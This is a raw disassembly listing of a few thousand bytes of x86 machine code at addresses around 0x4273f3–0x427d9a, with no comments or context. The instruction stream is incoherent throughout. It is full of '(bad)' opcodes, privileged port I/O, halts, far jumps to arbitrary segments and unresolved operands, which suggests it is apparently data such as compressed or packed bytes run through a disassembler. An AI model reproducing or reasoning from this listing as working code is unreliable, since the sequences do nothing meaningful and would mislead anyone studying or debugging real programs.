  4273f3:	cmp    edi,0x727ee6e3
  4273f9:	in     al,0x9a
  4273fb:	cmp    edi,esp
  4273fd:	fdivr  st(5),st
  4273ff:	cmp    bh,0xcb
  427402:	out    dx,al
  427403:	jge    0x4273dc
  427405:	int3   
  427406:	jb     0x42739b
  427408:	(bad)  
  427409:	mov    ebx,0x38734ca1
  42740e:	(bad)
  427412:	(bad)  
  427413:	retf   
  427414:	out    0xc8,eax
  427416:	add    al,0xfd
  427418:	add    esi,esp
  42741a:	daa    
  42741b:	adc    esi,DWORD PTR [esp+edi*2]
  42741e:	aas    
  42741f:	xor    DWORD PTR ss:[esi],0x8e1c3629
  427426:	test   dh,ah
  427428:	add    esi,DWORD PTR [ebp+0x40]
  42742b:	jmp    0x5347:0x55f7b388
  427432:	adc    DWORD PTR [eax+0x4],ebp
  427435:	hlt    
  427436:	add    BYTE PTR [ecx-0x48],0x0
	...
  427452:	add    ch,BYTE PTR [eax]
  427454:	shr    DWORD PTR [edi],cl
  427456:	pop    ebx
  427457:	sbb    al,0x52
  427459:	xor    ecx,DWORD PTR [eax+0x27]
  42745c:	shr    DWORD PTR [edi],cl
  42745e:	pop    ebx
  42745f:	js     0x4274b7
  427461:	add    al,0xf4
  427463:	sbb    esp,ebp
  427465:	popf   
  427466:	xor    ebx,DWORD PTR [edi]
  427468:	sbb    eax,0x8d272830
  42746d:	sar    DWORD PTR [ebp+edi*1+0x186cd929],1
  427474:	imul   esp,DWORD PTR [eax],0xdabcd3eb
  42747a:	les    ecx,FWORD PTR [ebx+0x7e]
  42747d:	jnp    0x4274ae
  42747f:	ret    
  427480:	out    0x7e,al
  427482:	or     edi,DWORD PTR [ebp-0x25]
  427485:	addr16 mov edi,0xe7ce6c2
  42748b:	pop    ebp
  42748c:	sbb    al,bh
  42748e:	jecxz  0x4274b7
  427490:	sti    
  427491:	jecxz  0x427498
  427493:	(bad)
  427496:	ss std 
  427498:	mov    DWORD PTR [ebx-0x41],esp
  42749b:	ret    0x7ee6
  42749e:	ss stc 
  4274a0:	mov    DWORD PTR [ebx+0x7ee6c2af],ebp
  4274a6:	ss adc eax,0x3a5b8a00
  4274ac:	inc    eax
  4274ad:	jmp    0x4a5637d4
  4274b2:	daa    
  4274b3:	cmp    al,BYTE PTR [eax-0x17]
	...
  4274ce:	add    BYTE PTR [edx],dl
  4274d0:	ret    
  4274d1:	pop    ss
  4274d2:	add    eax,DWORD PTR [edx-0x45628c9b]
  4274d8:	mov    eax,DWORD PTR es:[eax+ebx*8]
  4274dc:	int    0x86
  4274de:	mov    ah,0x77
  4274e0:	cmp    al,BYTE PTR [eax-0x17]
  4274e3:	pxor   mm2,QWORD PTR ds:0xc47bf7e9
  4274ea:	mov    ecx,0x91327d3d
  4274ef:	jmp    0xad9874b8
  4274f4:	fwait
  4274f5:	xor    BYTE PTR [edx-0x16bfc579],cl
  4274fb:	je     0x4274a8
  4274fd:	out    dx,eax
  4274fe:	mov    eax,ds:0xe9160b0f
  427503:	idiv   DWORD PTR [ebx-0x3c]
  427506:	cdq    
  427507:	out    0xf2,al
  427509:	jg     0x427540
  42750b:	xor    ah,BYTE PTR [esi]
  42750d:	std    
  42750e:	aaa    
  42750f:	jno    0x427503
  427511:	mov    al,ds:0xffc4cb6d
  427516:	pop    ebx
  427517:	inc    esp
  427518:	push   ss
  427519:	push   edi
  42751a:	adc    ecx,esi
  42751c:	push   cs
  42751d:	add    cl,ch
  42751f:	jb     0x427562
  427521:	dec    edi
  427522:	mul    bl
  427524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427525:	retf   
  427526:	stos   BYTE PTR es:[edi],al
  427527:	mul    DWORD PTR [edi]
  427529:	aad    0x53
  42752b:	jecxz  0x427591
  42752d:	imul   ebp,DWORD PTR [ebp+0x548b25b9],0x0
	...
  42754c:	call   0xec095d1e
  427551:	add    al,0x0
  427553:	add    BYTE PTR [esi-0x44],al
  427556:	dec    esp
  427557:	jmp    FWORD PTR [eax-0x62bc377f]
  42755d:	hlt    
  42755e:	shl    BYTE PTR [ebx+0x3fc521],cl
  427564:	xchg   esp,eax
  427565:	imul   BYTE PTR [edi-0x34]
  427568:	fiadd  WORD PTR [eax]
  42756a:	je     0x427587
  42756c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42756d:	test   BYTE PTR [ebx+0x7400cecc],0x13
  427574:	mov    ah,0xf6
  427576:	imul   ecx,esp,0x1e
  427579:	add    DWORD PTR [ebx+ecx*1-0x65],esi
  42757d:	std    
  42757e:	leave  
  42757f:	retf   
  427580:	push   cs
  427581:	add    ebp,edi
  427583:	cmp    cl,BYTE PTR [esi]
  427585:	outs   dx,BYTE PTR ds:[esi]
  427586:	add    cl,BYTE PTR [eax+0x43c7e750]
  42758c:	pop    ebp
  42758d:	push   esp
  42758e:	pop    edx
  42758f:	pop    ebx
  427590:	adc    al,0xbf
  427592:	adc    BYTE PTR [eax],al
  427594:	pop    eax
  427595:	test   al,0xe8
  427597:	add    ecx,0x64
  42759a:	push   edx
  42759b:	push   edi
  42759c:	aaa    
  42759d:	cmp    eax,0x9169e84f
  4275a2:	cld    
  4275a3:	inc    DWORD PTR [edi-0x568276dc]
  4275a9:	cmp    ah,ah
  4275ab:	mov    WORD PTR [eax],cs
  4275ad:	add    DWORD PTR [eax],eax
  4275af:	push   0x0
	...
  4275c9:	inc    ecx
  4275ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275cb:	jns    0x42758d
  4275cd:	push   ebp
  4275ce:	or     DWORD PTR [esi+0x15],edi
  4275d1:	fisttp QWORD PTR [eax]
  4275d3:	xchg   DWORD PTR [ebp-0x33],esi
  4275d6:	mov    eax,ds:0x4c400c79
  4275db:	fcom   QWORD PTR [eax+0x47]
  4275de:	or     edx,DWORD PTR [esi+0x57]
  4275e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275e2:	jle    0x42762e
  4275e4:	push   esp
  4275e6:	cmp    al,BYTE PTR [ebp+0x4ca9f3bf]
  4275ec:	add    esp,esi
  4275ee:	sub    eax,0x9744079a
  4275f3:	(bad)
  4275f6:	jmp    0xf1375d72
  4275fb:	add    eax,DWORD PTR [eax]
  4275fd:	jno    0x42766d
  4275ff:	inc    DWORD PTR [edx+0x30ba]
  427605:	jns    0x4275f8
  427607:	pop    ds
  427608:	dec    edi
  427609:	push   cs
  42760a:	sub    eax,0xf78c54d6
  42760f:	sar    esp,0x73
  427612:	xchg   ebp,eax
  427613:	(bad)
  427616:	outs   dx,BYTE PTR ds:[esi]
  427617:	inc    DWORD PTR [ebx+0x3092]
  42761d:	ja     0x427648
  42761f:	sbb    al,0xff
  427621:	add    ch,BYTE PTR [edx+0x2df40164]
  427627:	jge    0x42766b
  427629:	dec    esp
  42762a:	pop    esi
  42762b:	call   0x0:0xff
	...
  427646:	mov    eax,ds:0xc2461882
  42764b:	loop   0x42767c
  42764d:	xchg   BYTE PTR [ecx-0xc407a17],dh
  427653:	test   eax,0x2df4017c
  427658:	cmp    DWORD PTR [edx+0x1c],0x2e
  42765c:	inc    DWORD PTR [ebx+0x3076]
  427662:	jno    0x4276cd
  427664:	xor    BYTE PTR [edi+0x69],cl
  427667:	jno    0x4276a9
  427669:	dec    edi
  42766a:	dec    edx
  42766b:	jnp    0x427685
  42766d:	and    bh,BYTE PTR [edx]
  42766f:	sbb    ebp,DWORD PTR [esi+eax*4]
  427672:	cmp    esi,esi
  427674:	test   DWORD PTR [edi-0x6394fb15],edi
  42767a:	cmc    
  42767b:	add    al,0xe7
  42767d:	or     BYTE PTR [esi+0x15],0xe6
  427681:	(bad)  
  427682:	ja     0x427646
  427684:	call   0x2bd46a8c
  427689:	sub    BYTE PTR [ebx-0x51],al
  42768c:	jmp    0xe96fb766
  427691:	mov    ebp,0xc95f23a0
  427696:	mov    bl,0x89
  427698:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427699:	push   DWORD PTR [edi-0x36]
  42769c:	call   0xbca6aa4
  4276a1:	cmp    BYTE PTR [ebx-0x17f3f53],al
  4276a7:	js     0x4276c7
  4276a9:	sbb    al,0x0
	...
  4276c3:	mov    dl,0xf8
  4276c5:	out    0x3,al
  4276c7:	jg     0x427692
  4276c9:	outs   dx,BYTE PTR ds:[esi]
  4276ca:	aam    0x6c
  4276cc:	dec    ebx
  4276cd:	push   ss
  4276ce:	(bad)  
  4276cf:	pop    eax
  4276d0:	cdq    
  4276d1:	repnz sbb ebp,DWORD PTR [edx]
  4276d4:	rcr    DWORD PTR [ebp+0x2f],1
  4276d7:	jbe    0x42771d
  4276d9:	fcmovb st,st(2)
  4276db:	je     0x42767e
  4276dd:	dec    esi
  4276de:	add    al,0xe9
  4276e0:	mov    bh,bl
  4276e2:	add    esp,esi
  4276e4:	add    al,0x6a
  4276e6:	mov    cl,0x23
  4276e8:	push   cs
  4276e9:	out    0x86,al
  4276eb:	lock push es
  4276ed:	out    0x3,eax
  4276ef:	les    ecx,FWORD PTR [edi-0x6681d455]
  4276f5:	inc    edx
  4276f6:	sbb    al,0xfa
  4276f8:	call   0x7b12:0xa16f03e6
  4276ff:	and    DWORD PTR [eax+ebp*4],ebp
  427702:	adc    esp,esi
  427704:	add    al,0x4f
  427706:	add    bh,cl
  427708:	xchg   edi,edi
  42770a:	idiv   eax
  42770c:	add    al,0x0
  42770e:	bound  ebp,QWORD PTR [ebp+0xc2c3626]
  427714:	adc    DWORD PTR [edx+0x4f0c4],eax
  42771a:	add    BYTE PTR [ebp+0x76e3e816],ch
  427720:	lahf   
  427721:	jecxz  0x42770c
  427723:	mov    dl,0x87
  427725:	aad    0xe8
	...
  42773f:	add    bh,dh
  427741:	add    al,0x89
  427743:	sub    al,0xa0
  427745:	dec    ecx
  427746:	add    bl,ch
  427748:	test   DWORD PTR [eax+eax*1],0x69f6b772
  42774f:	out    0x32,al
  427751:	(bad)  
  427752:	(bad)  
  427754:	test   DWORD PTR [eax+eax*1],0x7d626d2f
  42775b:	mov    ebp,0xf9122147
  427760:	sub    eax,ebp
  427762:	dec    DWORD PTR [edi]
  427764:	loope  0x42772c
  427766:	(bad)  [edi+esi*4-0x6b]
  42776a:	and    dl,bl
  42776c:	dec    ecx
  42776d:	(bad)  
  42776e:	jp     0x427701
  427770:	aas    
  427771:	sub    ch,BYTE PTR [ebx]
  427773:	std    
  427774:	test   DWORD PTR [ecx+ecx*4],0x6abab9c
  42777b:	jb     0x427737
  42777d:	sub    edx,ecx
  42777f:	outs   dx,DWORD PTR ds:[esi]
  427780:	test   DWORD PTR [ebx+eax*4],0x6a0c5c29
  427787:	loope  0x42773b
  427789:	(bad)  
  42778a:	(bad)  
  42778c:	test   DWORD PTR [eax+eax*1],0xefc68ebf
  427793:	bound  esi,QWORD PTR [esi+ebp*1]
  427796:	or     al,0x56
  427798:	rol    DWORD PTR [esi+eax*8],0x0
  42779c:	push   0x5001044a
  4277a1:	(bad)  
  4277a2:	jo     0x4277a9
	...
  4277bc:	add    ch,dh
  4277be:	ret    0x89
  4277c1:	int    0xa0
  4277c3:	aas    
  4277c4:	or     BYTE PTR [eax-0x37],ah
  4277c7:	jno    0x4277d1
  4277c9:	inc    esi
  4277ca:	dec    edx
  4277cb:	lock jmp 0x427e02
  4277d1:	push   esi
  4277d2:	icebp  
  4277d3:	xchg   DWORD PTR [ebp-0x43],eax
  4277d6:	add    dh,bl
  4277d8:	adc    ebx,DWORD PTR [ebp+0x5d458705]
  4277de:	fwait
  4277df:	inc    edi
  4277e0:	or     ch,bh
  4277e2:	out    dx,eax
  4277e3:	jno    0x4277bd
  4277e5:	sahf   
  4277e6:	fisttp WORD PTR [ebp-0x77]
  4277e9:	out    dx,al
  4277ea:	add    al,0xe8
  4277ec:	lock sbb BYTE PTR [ecx],cl
  4277ef:	add    BYTE PTR [ecx],al
  4277f1:	into   
  4277f2:	add    al,0x87
  4277f4:	dec    ebp
  4277f5:	xchg   ecx,eax
  4277f6:	mov    BYTE PTR ds:0x843e62f,dh
  4277fc:	je     0x427855
  4277fe:	pushf  
  4277ff:	dec    edi
  427800:	or     BYTE PTR [ebx-0x25d0eff4],dl
  427806:	inc    ebx
  427807:	or     BYTE PTR [ebx+0x514d0190],cl
  42780d:	(bad)  
  42780e:	pop    ebx
  42780f:	or     BYTE PTR [ebx],al
  427811:	xchg   esi,eax
  427812:	sbb    eax,0xa1e2e84d
  427817:	cld    
  427818:	call   FWORD PTR [esp+eax*2]
  42781b:	or     BYTE PTR [ebx+0x4b87214e],cl
	...
  427839:	add    BYTE PTR ds:0x21c6297b,dl
  42783f:	sbb    eax,0xb5688cfc
  427844:	push   esp
  427845:	call   0x511f3e
  42784a:	hlt    
  42784b:	rol    ah,0xf7
  42784e:	inc    esp
  42784f:	xchg   ebx,eax
  427850:	inc    edx
  427851:	dec    edi
  427852:	jmp    0x4277ed
  427854:	adc    ch,bh
  427856:	imul   ebp,DWORD PTR [edx],0x2f289e18
  42785c:	sub    eax,DWORD PTR [edx-0x76eb3d4c]
  427862:	inc    ecx
  427863:	es test ebp,esi
  427866:	dec    eax
  427867:	sub    al,dl
  427869:	mov    BYTE PTR [edx-0xb8d47ba],dh
  42786f:	sub    eax,0x95044079
  427874:	scas   eax,DWORD PTR es:[edi]
  427875:	adc    ebp,DWORD PTR [edi-0xf]
  427878:	aas    
  427879:	mov    esp,esi
  42787b:	xor    eax,edx
  42787d:	jb     0x42787f
  42787f:	stos   DWORD PTR es:[edi],eax
  427880:	lods   eax,DWORD PTR ds:[esi]
  427881:	out    0xf0,eax
  427883:	clc    
  427884:	add    eax,0x11637c6
  427889:	jmp    0xd05ca70
  42788e:	jns    0x42788e
  427890:	sub    bh,ah
  427892:	imul   ebp,DWORD PTR [ebx+0x26f7e7ad],0xffffff85
  427899:	inc    ebp
  42789a:	pop    ebx
  42789b:	scas   eax,DWORD PTR es:[edi]
  42789c:	sub    eax,ebp
	...
  4278b6:	add    BYTE PTR [edi+0x1f6a0405],dh
  4278bc:	mov    cl,0xad
  4278be:	mov    ds:0x10d6c59c,eax
  4278c3:	hlt    
  4278c4:	sub    eax,0x7e2c427d
  4278c9:	ja     0x42788f
  4278cb:	(bad)  
  4278cc:	fidiv  WORD PTR [ebp-0x39edcf1]
  4278d2:	out    0xb4,eax
  4278d4:	sub    DWORD PTR [ebx],0x270579fc
  4278da:	mov    bh,0xe6
  4278dc:	mov    edx,DWORD PTR [ebx-0x65e889d5]
  4278e2:	std    
  4278e3:	stos   DWORD PTR es:[edi],eax
  4278e4:	mov    esp,DWORD PTR [ebx+ebx*1]
  4278e7:	fcomp  DWORD PTR [eax-0x3c8cfc1a]
  4278ed:	fidivr DWORD PTR [edx+0x64]
  4278f0:	in     eax,0x61
  4278f2:	(bad)  
  4278f3:	xlat   BYTE PTR ds:[ebx]
  4278f4:	xchg   ecx,eax
  4278f5:	sahf   
  4278f6:	sub    al,0x52
  4278f8:	push   ds
  4278f9:	in     eax,0x2b
  4278fb:	clc    
  4278fc:	add    al,0x56
  4278fe:	std    
  4278ff:	ins    BYTE PTR es:[edi],dx
  427900:	rcr    DWORD PTR [esi+0x5fe92c7d],1
  427906:	(bad)  
  427907:	fld    TBYTE PTR [edx+0x692e7914]
  42790d:	push   ds
  42790e:	sbb    al,0xbe
  427910:	repnz out 0x3,al
  427913:	outs   dx,DWORD PTR ds:[esi]
  427914:	leave  
  427915:	scas   al,BYTE PTR es:[edi]
  427916:	aam    0x7c
  427918:	inc    edi
  427919:	sub    eax,DWORD PTR ss:[eax]
	...
  427934:	push   es
  427935:	cmc    
  427936:	popf   
  427937:	mov    cl,0xef
  427939:	sub    al,0x99
  42793b:	mov    edi,0x34611f78
  427940:	jbe    0x427958
  427942:	cli    
  427943:	(bad)  [ecx+eiz*4+0x7e]
  427947:	add    al,0xea
  427949:	loop   0x4279ae
  42794b:	(bad)  
  42794c:	or     esi,DWORD PTR [ebp-0x4ae038a5]
  427952:	gs mov cl,0x43
  427955:	mov    esp,DWORD PTR [esp+ebx*1]
  427958:	out    dx,al
  427959:	iret   
  42795a:	push   ebp
  42795b:	sub    esi,DWORD PTR [edi+0x44]
  42795e:	shl    edi,cl
  427960:	jl     0x42792b
  427962:	rcl    BYTE PTR ds:[ebx],cl
  427965:	xor    BYTE PTR [edx-0x720bfd],0xa9
  42796c:	or     esp,DWORD PTR [edi]
  42796e:	mov    al,0x29
  427970:	fisub  WORD PTR [eax]
  427972:	xchg   BYTE PTR [edx-0xebd73c9],ch
  427978:	add    ah,0x3
  42797b:	add    BYTE PTR [edi+0x21],ah
  42797e:	cld    
  42797f:	push   cs
  427980:	jnp    0x4279c8
  427982:	cld    
  427983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427984:	mov    ebp,0xf7edc147
  427989:	mov    cl,0x88
  42798b:	add    eax,0x9a232a73
  427990:	push   edx
  427991:	mov    BYTE PTR ss:[eax+eiz*8],ch
  427995:	add    eax,ecx
  427997:	aaa    
	...
  4279b0:	add    BYTE PTR [ebp+ecx*1+0x1e3c09e8],al
  4279b7:	cld    
  4279b8:	(bad)  
  4279b9:	out    0x82,eax
  4279bb:	cmc    
  4279bc:	cmp    al,0xf7
  4279be:	sar    DWORD PTR [edi-0x3e1b430],cl
  4279c4:	jmp    0x5c6c268f
  4279c9:	pop    esp
  4279ca:	cmp    dl,BYTE PTR [edi-0x6f]
  4279cd:	mov    eax,ds:0xfce8fff4
  4279d2:	ret    0x39fb
  4279d5:	sti    
  4279d6:	dec    eax
  4279d7:	dec    edi
  4279d8:	cmp    bl,BYTE PTR [edi]
  4279da:	xchg   ebx,eax
  4279db:	pop    es
  4279dc:	xchg   ecx,eax
  4279dd:	mov    ebp,ecx
  4279df:	cld    
  4279e0:	jle    0x4279c2
  4279e2:	ret    0x6cf7
  4279e5:	mov    bh,0x91
  4279e7:	bound  eax,QWORD PTR [ebx]
  4279e9:	push   edx
  4279ea:	mov    eax,DWORD PTR [edx+0x55]
  4279ed:	daa    
  4279ee:	and    DWORD PTR [edx-0x7],esi
  4279f1:	push   cs
  4279f2:	rep outs dx,DWORD PTR ds:[esi]
  4279f4:	push   DWORD PTR [edi]
  4279f6:	push   ds
  4279f7:	and    DWORD PTR ds:0x428b2b,0x15fb31c1
  427a01:	fincstp 
  427a03:	aas    
  427a04:	add    BYTE PTR [esi+0x682bf434],dl
  427a0a:	sbb    cl,BYTE PTR [esi-0x1]
  427a0d:	push   0x1ee8521a
  427a12:	xchg   esi,eax
  427a13:	cld    
  427a14:	inc    DWORD PTR [eax]
	...
  427a2e:	cmp    eax,0xacec499d
  427a33:	pushf  
  427a34:	or     BYTE PTR [edx],dh
  427a36:	mov    ecx,?
  427a38:	and    DWORD PTR [ebp+ecx*8-0x30c376ff],ecx
  427a3f:	sahf   
  427a40:	inc    ecx
  427a41:	cld    
  427a42:	mov    dh,0xcf
  427a44:	daa    
  427a45:	fcomp  st(6)
  427a47:	pop    esi
  427a48:	hlt    
  427a49:	push   ebx
  427a4a:	std    
  427a4b:	xchg   ebp,eax
  427a4c:	add    BYTE PTR [esi],bh
  427a4e:	std    
  427a4f:	add    BYTE PTR [edx],cl
  427a51:	mov    WORD PTR [ebp-0x4eba76ff],ds
  427a57:	cmp    BYTE PTR [esi+0x3],ah
  427a5a:	mov    ?,eax
  427a5c:	push   ebx
  427a5d:	push   esi
  427a5e:	mov    ch,0x6
  427a60:	inc    edi
  427a61:	jmp    DWORD PTR [edx-0x63]
  427a64:	mov    esp,0xe4338775
  427a69:	mov    eax,0x33000906
  427a6e:	dec    ebp
  427a6f:	call   DWORD PTR ds:0xfaf908ff
  427a75:	jne    0x427ad8
  427a77:	xor    esp,esp
  427a79:	in     al,0xe6
  427a7b:	or     BYTE PTR [eax],al
  427a7d:	mov    ecx,DWORD PTR [eax]
  427a7f:	cmc    
  427a80:	test   BYTE PTR [eax],dh
  427a82:	(bad)  
  427a83:	ret    
  427a84:	daa    
  427a85:	inc    ebp
  427a86:	rol    DWORD PTR [edi],1
  427a88:	inc    ecx
  427a89:	adc    BYTE PTR [edx-0xb36a8b5],al
  427a8f:	jmp    0x427aa7
	...
  427aa8:	add    BYTE PTR [eax],al
  427aaa:	add    cl,cl
  427aac:	mov    ds:0x47188017,al
  427ab1:	and    DWORD PTR [edx+0x78],0x2b
  427ab5:	jne    0x427af9
  427ab7:	jo     0x427b34
  427ab9:	daa    
  427aba:	jb     0x427ab8
  427abc:	out    dx,al
  427abd:	or     al,0xac
  427abf:	cmp    BYTE PTR [edx+0x0],ch
  427ac2:	push   edi
  427ac3:	popf   
  427ac4:	test   al,0x43
  427ac6:	jb     0x427aba
  427ac8:	imul   ebp,ecx,0x42
  427acb:	xor    BYTE PTR [edx+0x2],0x31
  427acf:	mov    ah,0xd5
  427ad1:	inc    ebp
  427ad2:	add    esi,esp
  427ad4:	jb     0x427afd
  427ad6:	jae    0x427ae8
  427ad8:	es daa 
  427ada:	adc    dl,BYTE PTR [edx+edi*8+0x267effc2]
  427ae1:	leave  
  427ae2:	add    bl,0xb2
  427ae5:	aam    0x7f
  427ae7:	stc    
  427ae8:	cmp    eax,DWORD PTR [bx+si-0xc]
  427aec:	sub    eax,0xc79c23ac
  427af1:	sub    al,0xff
  427af3:	mov    ds:0xff7340a2,eax
  427af8:	sti    
  427af9:	imul   eax,DWORD PTR [edi+0x5603efc0],0x1208198b
  427b03:	xor    al,0x2e
  427b05:	iret   
  427b06:	out    0x19,eax
  427b08:	jns    0x427b31
  427b0a:	cld    
  427b0b:	retf   0xd8a
  427b0e:	sbb    al,0x0
	...
  427b28:	push   es
  427b29:	out    dx,al
  427b2a:	add    ebx,DWORD PTR [esi+0x6f]
  427b2d:	arpl   di,ax
  427b2f:	rol    bh,0xfb
  427b32:	jp     0x427ba7
  427b34:	sbb    BYTE PTR [edx],bh
  427b36:	into   
  427b37:	cld    
  427b38:	loope  0x427b3e
  427b3a:	fbstp  TBYTE PTR [edi]
  427b3c:	mov    ah,0x4
  427b3e:	jb     0x427b8b
  427b40:	mov    ds:0xeaae3181,al
  427b45:	adc    DWORD PTR [edi+ebp*4-0x1a],0x2c3debdc
  427b4d:	enter  0xafe6,0xce
  427b51:	sub    al,0xf9
  427b53:	adc    ebx,DWORD PTR cs:[edx+eiz*2]
  427b57:	inc    ebx
  427b58:	xchg   eax,esp
  427b5a:	mov    ebp,0xa9497b68
  427b5f:	add    esp,DWORD PTR [ecx+0x60bfb1b]
  427b65:	(bad)
  427b68:	ficom  WORD PTR [eax]
  427b6a:	add    eax,0xfd1c7428
  427b6f:	scas   al,BYTE PTR es:[edi]
  427b70:	imul   BYTE PTR [ecx+ebp*2]
  427b73:	xor    eax,edx
  427b75:	sbb    edx,DWORD PTR [ebp-0x70719d8]
  427b7b:	ret    
  427b7c:	ret    
  427b7d:	mov    edx,0xbfb47b3c
  427b82:	test   eax,0x529c7ccf
  427b87:	(bad)  [ebx]
  427b89:	popf   
  427b8a:	cmp    ch,ah
	...
  427ba4:	add    ah,bl
  427ba6:	cwde   
  427ba7:	add    bh,al
  427ba9:	ins    BYTE PTR es:[edi],dx
  427baa:	int3   
  427bab:	idiv   DWORD PTR ss:[esi]
  427bae:	cdq    
  427baf:	add    bh,al
  427bb1:	hlt    
  427bb2:	int3   
  427bb3:	push   ds
  427bb4:	iret   
  427bb5:	xor    bl,BYTE PTR [edx+edx*1]
  427bb8:	loopne 0x427ba5
  427bba:	sub    al,0x85
  427bbc:	jp     0x427c31
  427bbe:	sbb    esp,edi
  427bc0:	stos   DWORD PTR es:[edi],eax
  427bc1:	jecxz  0x427b52
  427bc3:	lods   al,BYTE PTR cs:[esi]
  427bc5:	sbb    al,0xcd
  427bc7:	repnz mov al,0xf1
  427bca:	test   bh,bh
  427bcc:	lock pushf 
  427bce:	sbb    esi,DWORD PTR [eax-0x24]
  427bd1:	outs   dx,DWORD PTR ds:[esi]
  427bd2:	or     ebx,0xffffffaa
  427bd5:	neg    DWORD PTR [ecx]
  427bd7:	adc    bh,ch
  427bd9:	in     eax,0xc4
  427bdb:	inc    DWORD PTR [ecx+0x20]
  427bde:	fwait
  427bdf:	ja     0x427bae
  427be1:	div    DWORD PTR [edx-0x1461258d]
  427be7:	out    0x66,eax
  427be9:	in     al,0x18
  427beb:	cld    
  427bec:	push   0xffffffe0
  427bee:	sbb    BYTE PTR [ebx-0x30],dh
  427bf1:	out    dx,eax
  427bf2:	(bad)  
  427bf3:	cmc    
  427bf4:	fld    TBYTE PTR es:[ecx+edx*1]
  427bf8:	ins    BYTE PTR es:[edi],dx
  427bf9:	inc    eax
  427bfa:	stos   DWORD PTR es:[edi],eax
  427bfb:	cld    
  427bfc:	fisttp WORD PTR [edi]
  427bfe:	stos   DWORD PTR es:[edi],eax
  427bff:	mov    ecx,ebp
  427c01:	imul   DWORD PTR [esi-0x480060f1]
  427c07:	mov    cl,ch
	...
  427c21:	add    bh,dh
  427c23:	lods   al,BYTE PTR ds:[esi]
  427c24:	xchg   DWORD PTR ds:0xd4fd1ab7,esp
  427c2a:	repz idiv BYTE PTR [edi]
  427c2d:	jmp    0x3f0709eb
  427c32:	add    al,BYTE PTR ss:[eax]
  427c35:	(bad)  
  427c36:	clc    
  427c37:	test   DWORD PTR [edi-0x773300ab],edi
  427c3d:	sbb    eax,0xd58a0694
  427c42:	pop    es
  427c43:	test   ecx,edi
  427c45:	in     al,0x63
  427c47:	pop    es
  427c48:	xor    BYTE PTR [ebx-0x59f96873],0x80
  427c4f:	(bad)  
  427c50:	iret   
  427c51:	xor    DWORD PTR [ebp+0x34],esi
  427c54:	jb     0x427be5
  427c56:	mov    ch,0x5
  427c58:	add    BYTE PTR [edi+ebp*8],dh
  427c5b:	sub    eax,0xee710080
  427c60:	jge    0x427c4e
  427c62:	rol    DWORD PTR ds:0x4aee0000,0x87
  427c69:	jne    0x427cc0
  427c6b:	lahf   
  427c6c:	inc    edx
  427c6d:	or     BYTE PTR [edx-0xebb7aca],al
  427c73:	or     al,0xfb
  427c75:	adc    eax,0x3ff3e1
  427c7a:	xchg   esp,eax
  427c7b:	pop    ecx
  427c7c:	and    BYTE PTR [esi+eiz*4],bl
  427c7f:	push   edi
  427c80:	sbb    al,0x89
  427c82:	push   ecx
  427c83:	cmp    ah,BYTE PTR [ebx+ecx*4]
	...
  427c9e:	add    BYTE PTR [ebx+0x3a],ah
  427ca1:	sub    dx,WORD PTR [ecx+ebx*2+0x61883020]
  427ca9:	and    BYTE PTR [eax+0x35],dl
  427cac:	dec    BYTE PTR [ecx]
  427cae:	adc    ch,bl
  427cb0:	add    eax,0x39b14489
  427cb5:	dec    esp
  427cb6:	mov    edx,DWORD PTR [edx]
  427cb8:	popf   
  427cb9:	pop    edx
  427cba:	sbb    BYTE PTR [ebp-0x1e],bh
  427cbd:	das    
  427cbe:	and    DWORD PTR [ebx],0xa
  427cc1:	sti    
  427cc2:	ss push esp
  427cc4:	inc    edx
  427cc5:	and    BYTE PTR [eax],ah
  427cc7:	inc    esp
  427cc8:	push   ebp
  427cc9:	and    BYTE PTR [eiz*4-0x3500baf6],ah
  427cd0:	cmp    DWORD PTR [eax+0x24],0xfffffff5
  427cd4:	add    BYTE PTR [ebp-0x78df0ebc],al
  427cda:	inc    ebp
  427cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427cdc:	pushf  
  427cdd:	inc    esp
  427cde:	or     al,0x16
  427ce0:	inc    ecx
  427ce1:	or     al,0x89
  427ce3:	jmp    0xd1cba90c
  427ce8:	and    al,0x30
  427cea:	movups XMMWORD PTR [esi],xmm6
  427ced:	std    
  427cee:	push   esp
  427cf0:	sub    esi,DWORD PTR [ebp+0x43]
  427cf3:	adc    BYTE PTR [eax+edx*8],dl
  427cf6:	out    0x4a,eax
  427cf8:	or     DWORD PTR [ebx],esp
  427cfa:	cld    
  427cfb:	jo     0x427d68
  427cfd:	repnz adc DWORD PTR [ebx],0x2d
	...
  427d19:	add    BYTE PTR [eax],al
  427d1b:	add    dh,bl
  427d1d:	inc    ebx
  427d1e:	jne    0x427d9b
  427d20:	sbb    al,ah
  427d22:	retf   
  427d23:	out    0x84,eax
  427d25:	sub    al,BYTE PTR [eax]
  427d27:	add    BYTE PTR [edi-0x16],bh
  427d2a:	sar    esp,cl
  427d2c:	out    0xca,eax
  427d2e:	in     eax,dx
  427d2f:	out    0x12,eax
  427d31:	push   esp
  427d32:	and    edi,esp
  427d34:	sbb    edx,DWORD PTR [ecx]
  427d36:	ja     0x427d00
  427d38:	jge    0x427d68
  427d3a:	sbb    BYTE PTR [ecx],ch
  427d3c:	or     ebp,edx
  427d3e:	and    ch,BYTE PTR [ecx-0x12]
  427d41:	nop
  427d42:	mov    edi,0x235b9023
  427d47:	jae    0x427d61
  427d49:	cmp    ah,BYTE PTR [ebx]
  427d4b:	adc    ah,BYTE PTR [eax+edx*1-0x40]
  427d4f:	push   DWORD PTR [esi-0x16]
  427d52:	imul   DWORD PTR [ecx+0xe]
  427d55:	test   eax,0x761023a7
  427d5a:	sbb    BYTE PTR [esi-0x5],dh
  427d5d:	sub    eax,0xa388b00
  427d62:	enter  0x6f4f,0x5f
  427d66:	sar    ah,1
  427d68:	out    0x2e,eax
  427d6a:	jmp    0x79fc:0x22e684e7
  427d71:	outs   dx,BYTE PTR ds:[esi]
  427d72:	lods   al,BYTE PTR ds:[esi]
  427d73:	cmp    DWORD PTR [ecx-0x1e],ebp
  427d76:	fistp  WORD PTR [edi+0x24]
  427d79:	dec    edi
  427d7a:	or     eax,0x3ede6c4
  427d7f:	mov    DWORD PTR [eax],eax
	...
  427d99:	lods   al,BYTE PTR ds:[esi]
  427d9a:	add    eax,0x8f93f8ea
